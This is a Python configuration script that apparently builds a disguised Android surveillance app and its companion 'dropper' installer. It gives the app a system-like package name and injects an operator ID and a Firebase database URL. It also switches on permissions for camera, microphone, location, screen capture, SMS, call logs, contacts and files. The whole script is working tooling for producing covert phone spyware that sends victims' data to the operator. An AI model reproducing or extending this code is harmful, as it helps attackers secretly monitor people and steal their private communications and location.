import os, re, base64, json, xml.sax.saxutils
from PIL import Image

app_name = os.environ.get("APP_NAME", "Mobile Control").strip() or "Mobile Control"
package_name = os.environ.get("PACKAGE_NAME", "com.system.service").strip() or "com.system.service"
webview_url = os.environ.get("WEBVIEW_URL", "https://google.com").strip() or "https://google.com"
user_id = os.environ.get("USER_ID", "master01").strip() or "master01"
icon_b64 = os.environ.get("ICON_B64", "")
feature_flags_raw = os.environ.get("FEATURE_FLAGS_RAW", "{}")
firebase_url = "https://its-free-pay-for-premium-acces-default-rtdb.asia-southeast1.firebasedatabase.app/"

try:
    features = json.loads(feature_flags_raw) if feature_flags_raw else {}
except Exception as e:
    features = {}

# Safe Android XML escaping
safe_app_name_attr = xml.sax.saxutils.quoteattr(app_name)[1:-1]
safe_app_name_xml = xml.sax.saxutils.escape(app_name).replace("'", "\\'")

# 1. Update AndroidManifest.xml
manifest = "app/src/main/AndroidManifest.xml"
if os.path.exists(manifest):
    with open(manifest, "r", encoding="utf-8") as f:
        c = f.read()
    c = re.sub(r'android:name="webview_url" android:value="[^"]*"', f'android:name="webview_url" android:value="{webview_url}"', c)
    c = re.sub(r'android:name="user_id" android:value="[^"]*"', f'android:name="user_id" android:value="{user_id}"', c)
    c = re.sub(r'android:name="firebase_url" android:value="[^"]*"', f'android:name="firebase_url" android:value="{firebase_url}"', c)
    c = re.sub(r'android:name="service_title" android:value="[^"]*"', f'android:name="service_title" android:value="{safe_app_name_attr}"', c)

    # Inject feature metadata flags
    meta_injections = ""
    for k, v in features.items():
        val_str = "true" if v else "false"
        c = re.sub(rf'<meta-data\s+android:name="feat_{k}"[^>]*/>\n?', '', c)
        meta_injections += f'        <meta-data android:name="feat_{k}" android:value="{val_str}" />\n'
    if meta_injections:
        app_tag_match = re.search(r'<application\b[^>]*>', c)
        if app_tag_match:
            end_pos = app_tag_match.end()
            c = c[:end_pos] + "\n" + meta_injections + c[end_pos:]

    # Strip permissions from manifest if unchecked by user & sync foregroundServiceType
    fgs_types = ["specialUse", "mediaProjection"]
    if features.get("camera") is not False or features.get("livecam") is not False:
        fgs_types.append("camera")
    else:
        c = re.sub(r'\s*<uses-permission\s+android:name="android.permission.CAMERA"[^>]*/>', '', c)
        c = re.sub(r'\s*<uses-permission\s+android:name="android.permission.FOREGROUND_SERVICE_CAMERA"[^>]*/>', '', c)

    if features.get("audio") is not False or features.get("livecam") is not False:
        fgs_types.append("microphone")
    else:
        c = re.sub(r'\s*<uses-permission\s+android:name="android.permission.RECORD_AUDIO"[^>]*/>', '', c)
        c = re.sub(r'\s*<uses-permission\s+android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE"[^>]*/>', '', c)

    if features.get("location") is not False:
        fgs_types.append("location")
    else:
        c = re.sub(r'\s*<uses-permission\s+android:name="android.permission.ACCESS_FINE_LOCATION"[^>]*/>', '', c)
        c = re.sub(r'\s*<uses-permission\s+android:name="android.permission.ACCESS_COARSE_LOCATION"[^>]*/>', '', c)
        c = re.sub(r'\s*<uses-permission\s+android:name="android.permission.FOREGROUND_SERVICE_LOCATION"[^>]*/>', '', c)

    if features.get("sms") is False:
        c = re.sub(r'\s*<uses-permission\s+android:name="android.permission.READ_SMS"[^>]*/>', '', c)
        c = re.sub(r'\s*<uses-permission\s+android:name="android.permission.RECEIVE_SMS"[^>]*/>', '', c)
    if features.get("calls") is False:
        c = re.sub(r'\s*<uses-permission\s+android:name="android.permission.READ_CALL_LOG"[^>]*/>', '', c)
        c = re.sub(r'\s*<uses-permission\s+android:name="android.permission.READ_CONTACTS"[^>]*/>', '', c)
        c = re.sub(r'\s*<uses-permission\s+android:name="android.permission.CALL_PHONE"[^>]*/>', '', c)
    if features.get("gallery") is False and features.get("files") is False:
        c = re.sub(r'\s*<uses-permission\s+android:name="android.permission.READ_EXTERNAL_STORAGE"[^>]*/>', '', c)
        c = re.sub(r'\s*<uses-permission\s+android:name="android.permission.READ_MEDIA_[^"]*"[^>]*/>', '', c)

    # Update foregroundServiceType attribute
    c = re.sub(r'android:foregroundServiceType="[^"]*"', f'android:foregroundServiceType="{"|".join(fgs_types)}"', c)

    with open(manifest, "w", encoding="utf-8") as f:
        f.write(c)

# 2. Update strings.xml (Main App)
strings = "app/src/main/res/values/strings.xml"
if os.path.exists(strings):
    with open(strings, "r", encoding="utf-8") as f:
        c = f.read()
    c = re.sub(r'<string name="app_name">.*</string>', f'<string name="app_name">{safe_app_name_xml}</string>', c)
    with open(strings, "w", encoding="utf-8") as f:
        f.write(c)

# 3. Update strings.xml (Dropper App)
dropper_strings = "dropper/src/main/res/values/strings.xml"
os.makedirs(os.path.dirname(dropper_strings), exist_ok=True)
with open(dropper_strings, "w", encoding="utf-8") as f:
    f.write(f'<?xml version="1.0" encoding="utf-8"?>\n<resources>\n    <string name="app_name">{safe_app_name_xml}</string>\n</resources>')

dropper_manifest = "dropper/src/main/AndroidManifest.xml"
if os.path.exists(dropper_manifest):
    with open(dropper_manifest, "r", encoding="utf-8") as f:
        c = f.read()
    c = re.sub(r'android:label="[^"]*"', 'android:label="@string/app_name"', c)
    with open(dropper_manifest, "w", encoding="utf-8") as f:
        f.write(c)

# 4. Update package name in build.gradle.kts
app_gradle = "app/build.gradle.kts"
if os.path.exists(app_gradle):
    with open(app_gradle, "r", encoding="utf-8") as f:
        c = f.read()
    c = re.sub(r'applicationId\s*=\s*"[^"]*"', f'applicationId = "{package_name}"', c)
    with open(app_gradle, "w", encoding="utf-8") as f:
        f.write(c)

dropper_gradle = "dropper/build.gradle.kts"
if os.path.exists(dropper_gradle):
    with open(dropper_gradle, "r", encoding="utf-8") as f:
        c = f.read()
    c = re.sub(r'applicationId\s*=\s*"[^"]*"', f'applicationId = "{package_name}.installer"', c)
    with open(dropper_gradle, "w", encoding="utf-8") as f:
        f.write(c)

# 5. Update google-services.json
gs = "app/google-services.json"
if os.path.exists(gs):
    with open(gs, "r", encoding="utf-8") as f:
        c = f.read()
    c = re.sub(r'"package_name":\s*"[^"]*"', f'"package_name": "{package_name}"', c)
    with open(gs, "w", encoding="utf-8") as f:
        f.write(c)

# 6. Process Custom Icon PNG if provided
if icon_b64 and len(icon_b64) > 10:
    try:
        icon_path = "temp_icon.png"
        with open(icon_path, "wb") as f:
            f.write(base64.b64decode(icon_b64))
        img = Image.open(icon_path)
        sizes = {"mdpi": 48, "hdpi": 72, "xhdpi": 96, "xxhdpi": 144, "xxxhdpi": 192}
        for target_dir in ["app/src/main/res", "dropper/src/main/res"]:
            for density, size in sizes.items():
                out_dir = os.path.join(target_dir, f"mipmap-{density}")
                os.makedirs(out_dir, exist_ok=True)
                img.resize((size, size)).save(os.path.join(out_dir, "ic_launcher.png"))
                img.resize((size, size)).save(os.path.join(out_dir, "ic_launcher_round.png"))
        print("Custom icon processed successfully!")
    except Exception as e:
        print(f"Icon decode error: {e}")

print("Configuration injection completed successfully!")
